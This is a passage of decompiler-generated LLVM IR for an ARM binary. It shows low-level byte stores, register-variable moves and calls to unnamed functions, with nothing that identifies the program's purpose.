  %v3_b520 = add i32 %v2_b520, 11
  %v4_b520 = inttoptr i32 %v3_b520 to i8*
  store i8 %v1_b520, i8* %v4_b520, align 1
  %v3_b524 = load i32, i32* @r5, align 4
  %v4_b524 = add i32 %v3_b524, 10
  %v5_b524 = inttoptr i32 %v4_b524 to i8*
  store i8 %v3_b518, i8* %v5_b524, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b52c = load i32, i32* @r8, align 4
  %v1_b52c = trunc i32 %v0_b52c to i8
  %v2_b52c = load i32, i32* @r6, align 4
  %v3_b52c = add i32 %v2_b52c, 10
  %v4_b52c = inttoptr i32 %v3_b52c to i8*
  store i8 %v1_b52c, i8* %v4_b52c, align 1
  %v0_b530 = load i32, i32* @r8, align 4
  %v1_b530 = trunc i32 %v0_b530 to i8
  %v2_b530 = load i32, i32* @r6, align 4
  %v3_b530 = add i32 %v2_b530, 11
  %v4_b530 = inttoptr i32 %v3_b530 to i8*
  store i8 %v1_b530, i8* %v4_b530, align 1
  %v0_b534 = load i32, i32* @r6, align 4
  store i32 %v0_b534, i32* @r0, align 4
  %v2_b538 = call i32 @function_e424(i32 %v0_b534, i32 20)
  %v3_b538 = trunc i32 %v2_b538 to i8
  store i32 %v2_b538, i32* %r0.global-to-local, align 4
  %v4_b53c = sdiv i32 %v2_b538, 256
  store i32 %v4_b53c, i32* %r3.global-to-local, align 4
  %v3_b540 = load i32, i32* @r6, align 4
  %v4_b540 = add i32 %v3_b540, 10
  %v5_b540 = inttoptr i32 %v4_b540 to i8*
  store i8 %v3_b538, i8* %v5_b540, align 1
  %v0_b544 = load i32, i32* %r3.global-to-local, align 4
  %v1_b544 = trunc i32 %v0_b544 to i8
  %v2_b544 = load i32, i32* @r6, align 4
  %v3_b544 = add i32 %v2_b544, 11
  %v4_b544 = inttoptr i32 %v3_b544 to i8*
  store i8 %v1_b544, i8* %v4_b544, align 1
  %v0_b548 = load i32, i32* @r7, align 4
  %v1_b548 = add i32 %v0_b548, 4
  %v2_b548 = inttoptr i32 %v1_b548 to i8*
  %v3_b548 = load i8, i8* %v2_b548, align 1
  %v4_b548 = zext i8 %v3_b548 to i32
  store i32 %v4_b548, i32* %r3.global-to-local, align 4
  %v1_b54c = add i32 %v0_b548, 5
  %v2_b54c = inttoptr i32 %v1_b54c to i8*
  %v3_b54c = load i8, i8* %v2_b54c, align 1
  %v4_b54c = zext i8 %v3_b54c to i32
  store i32 %v0_b548, i32* @r1, align 4
  %v4_b554 = mul nuw nsw i32 %v4_b54c, 256
  %v5_b554 = or i32 %v4_b554, %v4_b548
  store i32 %v5_b554, i32* %r2.global-to-local, align 4
  %v0_b558 = load i32, i32* @r8, align 4
  %v1_b558 = trunc i32 %v0_b558 to i8
  %v3_b558 = add i32 %v0_b548, 6
  %v4_b558 = inttoptr i32 %v3_b558 to i8*
  store i8 %v1_b558, i8* %v4_b558, align 1
  store i32 %stack_var_-152.0.ph, i32* %r3.global-to-local, align 4
  %v0_b560 = load i32, i32* @r8, align 4
  %v1_b560 = trunc i32 %v0_b560 to i8
  %v2_b560 = load i32, i32* @r7, align 4
  %v3_b560 = add i32 %v2_b560, 7
  %v4_b560 = inttoptr i32 %v3_b560 to i8*
  store i8 %v1_b560, i8* %v4_b560, align 1
  %v0_b564 = load i32, i32* @r6, align 4
  store i32 %v0_b564, i32* %r0.global-to-local, align 4
  %v4_b568 = call i32 @function_e480(i32 %v0_b564, i32 %v0_b548, i32 %v5_b554, i32 %stack_var_-152.0.ph)
  %v5_b568 = trunc i32 %v4_b568 to i8
  store i32 %v4_b568, i32* %r0.global-to-local, align 4
  %v3_b56c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b56c, i32* %r3.global-to-local, align 4
  %v3_b570 = mul i32 %v3_b56c, 32
  store i32 %v3_b570, i32* %r2.global-to-local, align 4
  %v0_b574 = load i32, i32* @r5, align 4
  %v1_b574 = add i32 %v0_b574, 16
  %v2_b574 = inttoptr i32 %v1_b574 to i32*
  %v3_b574 = load i32, i32* %v2_b574, align 4
  store i32 %v3_b574, i32* %r1.global-to-local, align 4
  %v5_b578 = mul i32 %v3_b56c, 24
  store i32 %v5_b578, i32* %r2.global-to-local, align 4
  %v4_b57c42 = udiv i32 %v4_b568, 256
  %v1_b580 = trunc i32 %v4_b57c42 to i8
  %v2_b580 = load i32, i32* @r7, align 4
  %v3_b580 = add i32 %v2_b580, 7
  %v4_b580 = inttoptr i32 %v3_b580 to i8*
  store i8 %v1_b580, i8* %v4_b580, align 1
  %v0_b584 = load i32, i32* %r2.global-to-local, align 4
  %v1_b584 = load i32, i32* @sb, align 4
  %v2_b584 = add i32 %v1_b584, %v0_b584
  store i32 %v2_b584, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_b58c = load i32, i32* @r7, align 4
  %v4_b58c = add i32 %v3_b58c, 6
  %v5_b58c = inttoptr i32 %v4_b58c to i8*
  store i8 %v5_b568, i8* %v5_b58c, align 1
  %v0_b590 = load i32, i32* %r1.global-to-local, align 4
  %v1_b590 = load i32, i32* %lr.global-to-local, align 4
  %v2_b590 = add i32 %v1_b590, 4
  %v3_b590 = inttoptr i32 %v2_b590 to i32*
  store i32 %v0_b590, i32* %v3_b590, align 4
  %v0_b594 = load i32, i32* %r3.global-to-local, align 4
  %v1_b594 = trunc i32 %v0_b594 to i8
  %v2_b594 = load i32, i32* %r2.global-to-local, align 4
  %v3_b594 = load i32, i32* @sb, align 4
  %v4_b594 = add i32 %v3_b594, %v2_b594
  %v5_b594 = inttoptr i32 %v4_b594 to i8*
  store i8 %v1_b594, i8* %v5_b594, align 1
  %v0_b598 = load i32, i32* @r8, align 4
  %v1_b598 = trunc i32 %v0_b598 to i8
  %v2_b598 = load i32, i32* %lr.global-to-local, align 4
  %v3_b598 = add i32 %v2_b598, 2
  %v4_b598 = inttoptr i32 %v3_b598 to i8*
  store i8 %v1_b598, i8* %v4_b598, align 1
  %v0_b59c = load i32, i32* @r8, align 4
  %v1_b59c = trunc i32 %v0_b59c to i8
  %v2_b59c = load i32, i32* %lr.global-to-local, align 4
  %v3_b59c = add i32 %v2_b59c, 1
  %v4_b59c = inttoptr i32 %v3_b59c to i8*
  store i8 %v1_b59c, i8* %v4_b59c, align 1
  %v0_b5a0 = load i32, i32* @r8, align 4
  %v1_b5a0 = trunc i32 %v0_b5a0 to i8
  %v2_b5a0 = load i32, i32* %lr.global-to-local, align 4
  %v3_b5a0 = add i32 %v2_b5a0, 3
  %v4_b5a0 = inttoptr i32 %v3_b5a0 to i8*
  store i8 %v1_b5a0, i8* %v4_b5a0, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b5ac = load i32, i32* @r5, align 4
  store i32 %v0_b5ac, i32* %r1.global-to-local, align 4
  store i32 %v3_b160, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-120.0.ph, i32* %r2.global-to-local, align 4
  %v0_b5b8 = load i32, i32* %lr.global-to-local, align 4
  %v6_b5c0 = inttoptr i32 %v0_b5ac to i32*
  %v7_b5c0 = call i32 @function_13eec(i32 %v3_b160, i32* %v6_b5c0, i32 %stack_var_-120.0.ph, i32 16384, i32 %v0_b5b8, i32 16)
  %v3_b5c4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b5c4, i32* %r3.global-to-local, align 4
  %v1_b5c8 = add i32 %v3_b5c4, 1
  store i32 %v1_b5c8, i32* %r0.global-to-local, align 4
  %v1_b5cc = load i32, i32* @fp, align 4
  %v9_b5cc = icmp eq i32 %v1_b5c8, %v1_b5cc
  store i1 %v9_b5cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b5c8, i32* %stack_var_-40, align 4
  %v6_b5d4 = icmp slt i32 %v1_b5c8, %v1_b5cc
  br i1 %v6_b5d4, label %dec_label_pc_b48c, label %dec_label_pc_b474

dec_label_pc_b5dc:                                ; preds = %dec_label_pc_b170
  store i32 %v3_b160, i32* %r0.global-to-local, align 4
  %v1_b5e0 = call i32 @function_13654(i32 %v3_b160)
  store i32 %v1_b5e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %dec_label_pc_b00c, %dec_label_pc_b5dc
  %v29_b5e8 = phi i32 [ %v3_b160, %dec_label_pc_b00c ], [ %v1_b5e0, %dec_label_pc_b5dc ]
  store i32 %v3_b00c, i32* %r4.global-to-local, align 4
  store i32 %v15_b00c, i32* %r8.global-to-local, align 4
  ret i32 %v29_b5e8

dec_label_pc_b5ec:                                ; preds = %dec_label_pc_b48c
  %v1_b5ec = add i32 %v2_b494, 16
  %v2_b5ec = inttoptr i32 %v1_b5ec to i32*
  %v3_b5ec = load i32, i32* %v2_b5ec, align 4
  store i32 %v3_b5ec, i32* %r4.global-to-local, align 4
  %v0_b5f0 = call i32 @function_fe60()
  store i32 %v0_b5f0, i32* %r0.global-to-local, align 4
  %v3_b5f4 = load i32, i32* %stack_var_-40, align 4
  %v5_b5fc = mul i32 %v3_b5f4, 24
  %v0_b600 = load i32, i32* %r4.global-to-local, align 4
  %v1_b604 = load i32, i32* @sb, align 4
  %v2_b604 = add i32 %v1_b604, %v5_b5fc
  store i32 %v2_b604, i32* %r1.global-to-local, align 4
  %v1_b608 = and i32 %v0_b600, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_b608, i32* %r3.global-to-local, align 4
  %v1_b600 = udiv i32 %v0_b600, 256
  %v3_b60c = and i32 %v1_b600, 65280
  store i32 %v3_b60c, i32* %r2.global-to-local, align 4
  %v3_b610 = mul i32 %v0_b600, 16777216
  %v1_b614 = add i32 %v2_b604, 20
  %v2_b614 = inttoptr i32 %v1_b614 to i8*
  %v3_b614 = load i8, i8* %v2_b614, align 1
  %v4_b614 = zext i8 %v3_b614 to i32
  store i32 %v4_b614, i32* %lr.global-to-local, align 4
  %v4_b618 = mul i32 %v1_b608, 256
  %v5_b618 = or i32 %v4_b618, %v3_b610
  %v4_b61c = udiv i32 %v0_b600, 16777216
  %v5_b61c = or i32 %v3_b60c, %v4_b61c
  %v2_b620 = or i32 %v5_b61c, %v5_b618
  %v7_b624 = lshr i32 %v0_b5f0, %v4_b614
  %v8_b624 = add i32 %v7_b624, %v2_b620
  %v3_b630 = mul i32 %v8_b624, 16777216
  %v1_b634 = and i32 %v8_b624, 65280
  store i32 %v1_b634, i32* %r0.global-to-local, align 4
  store i32 %v5_b14c, i32* %r2.global-to-local, align 4
  %v4_b640 = mul nuw nsw i32 %v1_b634, 256
  %v5_b640 = or i32 %v4_b640, %v3_b630
  store i32 %v5_b640, i32* %r1.global-to-local, align 4
  %v2_b644 = call i32 @llvm.bswap.i32(i32 %v8_b624)
  store i32 %v2_b644, i32* %r3.global-to-local, align 4
  store i1 %v7_b4b8, i1* %cpsr_z.global-to-local, align 1
  %v1_b64c = load i32, i32* @r5, align 4
  %v2_b64c = add i32 %v1_b64c, 16
  %v3_b64c = inttoptr i32 %v2_b64c to i32*
  store i32 %v2_b644, i32* %v3_b64c, align 4
  br i1 %v2_b4b8, label %dec_label_pc_b654, label %dec_label_pc_b4c0

dec_label_pc_b654:                                ; preds = %dec_label_pc_b5ec, %dec_label_pc_b4b4
  %v0_b654 = call i32 @function_fe60()
  store i32 %v0_b654, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  %v0_b660 = load i32, i32* @sl, align 4
  %v9_b660 = icmp eq i32 %v0_b660, 65535
  store i1 %v9_b660, i1* %cpsr_z.global-to-local, align 1
  %v1_b664 = load i32, i32* @r5, align 4
  %v2_b664 = add i32 %v1_b664, 12
  %v3_b664 = inttoptr i32 %v2_b664 to i32*
  store i32 %v0_b654, i32* %v3_b664, align 4
  br i1 %v9_b660, label %dec_label_pc_b66c, label %dec_label_pc_b654.dec_label_pc_b4d0_crit_edge

dec_label_pc_b654.dec_label_pc_b4d0_crit_edge:    ; preds = %dec_label_pc_b654
  %v1_b4d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b4d0

dec_label_pc_b66c:                                ; preds = %dec_label_pc_b654, %dec_label_pc_b4c0
  %v0_b66c = call i32 @function_fe60()
  %v3_b674 = urem i32 %v0_b66c, 65536
  store i32 %v3_b674, i32* %r0.global-to-local, align 4
  %v3_b67815 = udiv i32 %v0_b66c, 256
  %v1_b67c = trunc i32 %v3_b67815 to i8
  %v2_b67c = load i32, i32* @r5, align 4
  %v3_b67c = add i32 %v2_b67c, 5
  %v4_b67c = inttoptr i32 %v3_b67c to i8*
  store i8 %v1_b67c, i8* %v4_b67c, align 1
  %v0_b680 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v3_b1b4, i32* %r3.global-to-local, align 4
  %v1_b688 = sub i32 999, %v0_b680
  store i32 %v1_b688, i32* %r2.global-to-local, align 4
  %v3_b68c = sdiv i32 %v1_b688, 256
  store i32 %v3_b68c, i32* %r1.global-to-local, align 4
  %v1_b690 = load i32, i32* @r4, align 4
  %v9_b690 = icmp eq i32 %v3_b1b4, %v1_b690
  store i1 %v9_b690, i1* %cpsr_z.global-to-local, align 1
  %v1_b694 = trunc i32 %v0_b680 to i8
  %v2_b694 = load i32, i32* @r5, align 4
  %v3_b694 = add i32 %v2_b694, 4
  %v4_b694 = inttoptr i32 %v3_b694 to i8*
  store i8 %v1_b694, i8* %v4_b694, align 1
  %v0_b698 = load i32, i32* %r1.global-to-local, align 4
  %v1_b698 = trunc i32 %v0_b698 to i8
  %v2_b698 = load i32, i32* @r6, align 4
  %v3_b698 = add i32 %v2_b698, 5
  %v4_b698 = inttoptr i32 %v3_b698 to i8*
  store i8 %v1_b698, i8* %v4_b698, align 1
  %v0_b69c = load i32, i32* %r2.global-to-local, align 4
  %v1_b69c = trunc i32 %v0_b69c to i8
  %v2_b69c = load i32, i32* @r6, align 4
  %v3_b69c = add i32 %v2_b69c, 4
  %v4_b69c = inttoptr i32 %v3_b69c to i8*
  store i8 %v1_b69c, i8* %v4_b69c, align 1
  %v0_b6a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b6a0, label %dec_label_pc_b6a4, label %dec_label_pc_b66c.dec_label_pc_b4dc_crit_edge

dec_label_pc_b66c.dec_label_pc_b4dc_crit_edge:    ; preds = %dec_label_pc_b66c
  %v1_b4e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b4dc

dec_label_pc_b6a4:                                ; preds = %dec_label_pc_b66c, %dec_label_pc_b4d0
  %v0_b6a4 = call i32 @function_fe60()
  %v1_b6a4 = trunc i32 %v0_b6a4 to i8
  store i32 %v0_b6a4, i32* %r0.global-to-local, align 4
  store i32 %v3_b1b8, i32* %r1.global-to-local, align 4
  %v4_b6ac = sdiv i32 %v0_b6a4, 256
  store i32 %v4_b6ac, i32* %r3.global-to-local, align 4
  %v1_b6b0 = load i32, i32* @r4, align 4
  %v9_b6b0 = icmp eq i32 %v3_b1b8, %v1_b6b0
  store i1 %v9_b6b0, i1* %cpsr_z.global-to-local, align 1
  %v3_b6b4 = load i32, i32* @r5, align 4
  %v4_b6b4 = add i32 %v3_b6b4, 44
  %v5_b6b4 = inttoptr i32 %v4_b6b4 to i8*
  store i8 %v1_b6a4, i8* %v5_b6b4, align 1
  %v0_b6b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b6b8 = trunc i32 %v0_b6b8 to i8
  %v2_b6b8 = load i32, i32* @r7, align 4
  %v3_b6b8 = add i32 %v2_b6b8, 1
  %v4_b6b8 = inttoptr i32 %v3_b6b8 to i8*
  store i8 %v1_b6b8, i8* %v4_b6b8, align 1
  %v0_b6bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b6bc, label %dec_label_pc_b6c0, label %dec_label_pc_b4e8

dec_label_pc_b6c0:                                ; preds = %dec_label_pc_b6a4, %dec_label_pc_b4dc
  %v0_b6c0 = call i32 @function_fe60()
  %v1_b6c0 = trunc i32 %v0_b6c0 to i8
  store i32 %v0_b6c0, i32* %r0.global-to-local, align 4
  store i32 %v1_b1ac, i32* %r2.global-to-local, align 4
  %v4_b6c8 = sdiv i32 %v0_b6c0, 256
  store i32 %v4_b6c8, i32* %r3.global-to-local, align 4
  store i1 %v2_b4ec, i1* %cpsr_z.global-to-local, align 1
  %v1_b6d0 = trunc i32 %v4_b6c8 to i8
  %v2_b6d0 = load i32, i32* @r7, align 4
  %v3_b6d0 = add i32 %v2_b6d0, 3
  %v4_b6d0 = inttoptr i32 %v3_b6d0 to i8*
  store i8 %v1_b6d0, i8* %v4_b6d0, align 1
  %v0_b6d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b6d4, label %bb101, label %bb100

bb100:                                            ; preds = %dec_label_pc_b6c0
  %v1_b6d4 = load i32, i32* @r5, align 4
  %v2_b6d4 = add i32 %v1_b6d4, 16
  %v3_b6d4 = inttoptr i32 %v2_b6d4 to i32*
  %v4_b6d4 = load i32, i32* %v3_b6d4, align 4
  store i32 %v4_b6d4, i32* %r3.global-to-local, align 4
  br label %bb101

bb101:                                            ; preds = %dec_label_pc_b6c0, %bb100
  %v3_b6d8 = load i32, i32* @r7, align 4
  %v4_b6d8 = add i32 %v3_b6d8, 2
  %v5_b6d8 = inttoptr i32 %v4_b6d8 to i8*
  store i8 %v1_b6c0, i8* %v5_b6d8, align 1
  %v0_b6dc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b6dc, label %dec_label_pc_b6e4, label %bb102

bb102:                                            ; preds = %bb101
  %v1_b6dc = load i32, i32* %r3.global-to-local, align 4
  %v2_b6dc = load i32, i32* @r6, align 4
  %v3_b6dc = add i32 %v2_b6dc, 16
  %v4_b6dc = inttoptr i32 %v3_b6dc to i32*
  store i32 %v1_b6dc, i32* %v4_b6dc, align 4
  br label %dec_label_pc_b4fc

dec_label_pc_b6e4:                                ; preds = %dec_label_pc_b4e8, %bb101
  %v0_b6e4 = call i32 @function_fe60()
  store i32 %v0_b6e4, i32* %r0.global-to-local, align 4
  store i32 %v1_b118, i32* %r3.global-to-local, align 4
  store i1 %v2_b6ec, i1* %cpsr_z.global-to-local, align 1
  %v1_b6f0 = load i32, i32* @r6, align 4
  %v2_b6f0 = add i32 %v1_b6f0, 16
  %v3_b6f0 = inttoptr i32 %v2_b6f0 to i32*
  store i32 %v0_b6e4, i32* %v3_b6f0, align 4
  br i1 %v2_b6ec, label %dec_label_pc_b508, label %dec_label_pc_b6f8

dec_label_pc_b6f8:                                ; preds = %dec_label_pc_b4fc, %dec_label_pc_b6e4
  %v0_b6f8 = load i32, i32* @r7, align 4
  %v1_b6f8 = add i32 %v0_b6f8, 8
  store i32 %v1_b6f8, i32* %r0.global-to-local, align 4
  store i32 %v5_b0f8, i32* @r1, align 4
  %v1_b700 = inttoptr i32 %v1_b6f8 to i8*
  %v2_b700 = call i32 @function_1003c(i8* %v1_b700)
  store i32 %v2_b700, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b508

dec_label_pc_b708:                                ; preds = %dec_label_pc_b198
  %v1_b710 = add i32 %v5_b0f8, 8
  store i32 %v1_b710, i32* %r2.global-to-local, align 4
  %v1_b714 = add i32 %v5_b0f8, 52
  store i32 %v1_b714, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b474.preheader

; uselistorder directives
  uselistorder i32 %v1_b714, { 1, 0 }
  uselistorder i32 %v1_b710, { 1, 0 }
  uselistorder i32 %v4_b6c8, { 1, 0 }
  uselistorder i32 %v0_b6c0, { 0, 2, 1 }
  uselistorder i32 %v0_b6a4, { 0, 2, 1 }
  uselistorder i32 %v2_b644, { 1, 0 }
  uselistorder i32 %v8_b624, { 1, 2, 0 }
  uselistorder i32 %v0_b600, { 1, 0, 2, 3 }
  uselistorder i32 %v1_b5cc, { 1, 2, 0 }
  uselistorder i32 %v1_b5c8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_b56c, { 1, 0, 2 }
  uselistorder i32 %v4_b568, { 0, 2, 1 }
  uselistorder i32 %v0_b548, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_b538, { 0, 2, 1 }
  uselistorder i32 %v4_b51c, { 1, 0 }
  uselistorder i32 %v7_b4a0, { 1, 0, 2 }
  uselistorder i32 %v0_b474, { 1, 0 }
  uselistorder i1 %v7_b4b8, { 2, 1, 0 }
  uselistorder i1 %v2_b6ec, { 2, 3, 1, 0 }
  uselistorder i32 %v1_b434, { 1, 0, 2 }
  uselistorder i32 %v0_b3f8, { 1, 0, 2 }
  uselistorder i32 %v3_b2ac, { 0, 2, 1 }
  uselistorder i32 %v3_b26c, { 1, 0 }
  uselistorder i32 %tmp86, { 1, 0 }
  uselistorder i32 %v1_b224, { 1, 0 }
  uselistorder i32 %v1_b200, { 1, 0 }
  uselistorder i32 %v1_b1fc, { 0, 2, 1 }
  uselistorder i32 %v3_b1e0, { 2, 1, 0 }
  uselistorder i32 %v0_b1bc, { 1, 0, 2 }
  uselistorder i32 %v1_b1ac, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_b1a8, { 0, 2, 1 }
  uselistorder i32 %v0_b1a4, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_b190, { 1, 0 }
  uselistorder i1 %v7_b164, { 1, 0 }
  uselistorder i32 %v3_b160, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_b14c, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_b118, { 1, 0, 2 }
  uselistorder i32 %v5_b0f8, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8 %v5_b09c, { 1, 0 }
  uselistorder i32 %v2_b02c, { 0, 3, 1, 2 }
  uselistorder i32 %v1_b010, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 20, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 36, 35, 37, 38, 40, 39, 42, 41, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 6, 7, 4, 5, 9, 8, 10, 13, 11, 12, 14, 16, 15, 17, 18, 23, 19, 20, 21, 22, 26, 24, 25, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29 }
  uselistorder i8 47, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_b6f8, { 1, 0 }
  uselistorder label %dec_label_pc_b6e4, { 1, 0 }
  uselistorder label %bb101, { 1, 0 }
  uselistorder label %dec_label_pc_b5e4, { 1, 0 }
  uselistorder label %dec_label_pc_b508, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b474.preheader, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %bb93, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %.thread23, { 2, 1, 0 }
}

define i32 @function_b728(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b728:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp30 = call i8 @__decompiler_undefined_function_1()
  %tmp31 = call i8 @__decompiler_undefined_function_1()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_b72c = urem i32 %arg1, 256
  store i32 %v1_b72c, i32* @fp, align 4
  store i32 %v1_b72c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_b744 = urem i32 %arg3, 256
  store i32 %v1_b744, i32* @r4, align 4
  %v2_b748 = call i32 @function_14254(i32 %v1_b72c, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_b754 = load i32, i32* @fp, align 4
  store i32 %v0_b754, i32* %r0.global-to-local, align 4
  %v2_b758 = call i32 @function_14254(i32 %v0_b754, i32 4)
  %v0_b75c = load i32, i32* @r5, align 4
  store i32 %v0_b75c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b76c = load i32, i32* @r4, align 4
  store i32 %v0_b76c, i32* %r0.global-to-local, align 4
  %v5_b770 = inttoptr i32 %v0_b75c to i32*
  %v6_b770 = call i32 @function_a4e8(i32 %v0_b76c, i32* %v5_b770, i32 2, i32 0)
  %v1_b77c = urem i32 %v6_b770, 256
  store i32 %v1_b77c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b788 = load i32, i32* @r5, align 4
  store i32 %v0_b788, i32* %r1.global-to-local, align 4
  %v0_b78c = load i32, i32* @r4, align 4
  store i32 %v0_b78c, i32* %r0.global-to-local, align 4
  %v6_b794 = inttoptr i32 %v0_b788 to i32*
  %v7_b794 = call i32 @function_a4e8(i32 %v0_b78c, i32* %v6_b794, i32 3, i32 65535)
  %v0_b798 = load i32, i32* @r5, align 4
  store i32 %v0_b798, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b794, i32* @r6, align 4
  %v0_b7a8 = load i32, i32* @r4, align 4
  store i32 %v0_b7a8, i32* %r0.global-to-local, align 4
  %v4_b7ac = inttoptr i32 %v0_b798 to i32*
  %v5_b7ac = call i32 @function_a4e8(i32 %v0_b7a8, i32* %v4_b7ac, i32 4, i32 64)
  %v1_b7b4 = urem i32 %v5_b7ac, 256
  store i32 %v1_b7b4, i32* %ip.global-to-local, align 4
  %v0_b7b8 = load i32, i32* @r5, align 4
  store i32 %v0_b7b8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b7c4 = load i32, i32* @r4, align 4
  store i32 %v0_b7c4, i32* %r0.global-to-local, align 4
  %v6_b7cc = inttoptr i32 %v0_b7b8 to i32*
  %v7_b7cc = call i32 @function_a4e8(i32 %v0_b7c4, i32* %v6_b7cc, i32 5, i32 1)
  %v1_b7d8 = urem i32 %v7_b7cc, 256
  store i32 %v1_b7d8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b7e0 = load i32, i32* @r5, align 4
  store i32 %v0_b7e0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b7e8 = load i32, i32* @r4, align 4
  store i32 %v0_b7e8, i32* %r0.global-to-local, align 4
  %v5_b7f0 = inttoptr i32 %v0_b7e0 to i32*
  %v6_b7f0 = call i32 @function_a4e8(i32 %v0_b7e8, i32* %v5_b7f0, i32 7, i32 65535)
  %v0_b7f4 = load i32, i32* @r5, align 4
  store i32 %v0_b7f4, i32* %r1.global-to-local, align 4
  %v3_b7f8 = mul i32 %v6_b7f0, 65536
  store i32 %v3_b7f8, i32* @r7, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b804 = load i32, i32* @r4, align 4
  store i32 %v0_b804, i32* %r0.global-to-local, align 4
  %v4_b808 = inttoptr i32 %v0_b7f4 to i32*
  %v5_b808 = call i32 @function_a4e8(i32 %v0_b804, i32* %v4_b808, i32 11, i32 0)
  %v1_b810 = urem i32 %v5_b808, 256
  store i32 %v1_b810, i32* %ip.global-to-local, align 4
  %v0_b814 = load i32, i32* @r5, align 4
  store i32 %v0_b814, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b820 = load i32, i32* @r4, align 4
